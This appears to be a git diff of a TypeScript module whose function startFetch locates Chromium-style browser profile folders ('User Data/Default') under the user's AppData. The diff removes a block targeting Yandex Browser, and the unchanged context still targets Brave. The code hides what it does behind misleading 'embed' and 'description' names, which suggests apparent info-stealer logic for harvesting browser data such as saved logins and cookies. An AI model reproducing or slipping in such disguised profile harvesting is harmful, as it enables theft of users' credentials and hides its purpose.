@@ -63,21 +63,6 @@ export const startFetch = async () => {
       `${process.env.APPDATA!}/../local`,
       `${embedBraveDescription!}/Brave-Browser/User Data/Default`
     );
-
-  const embedYanDescription = emebdAlternateTitle.find(
-    (title) => title === "Yandex"
-  );
-  const embedYannyDescription = await readdir(
-    `${process.env.APPDATA!}/../local/${embedYanDescription!}`
-  );
-  if (
-    embedYanDescription &&
-    embedYannyDescription.find((title) => title === "YandexBrowser")
-  )
-    createEmbed(
-      `${process.env.APPDATA!}/../local`,
-      `${embedYanDescription!}/YandexBrowser/User Data/Default`
-    );
 };
 
 const createEmbed = async (title: string, description: string) => {
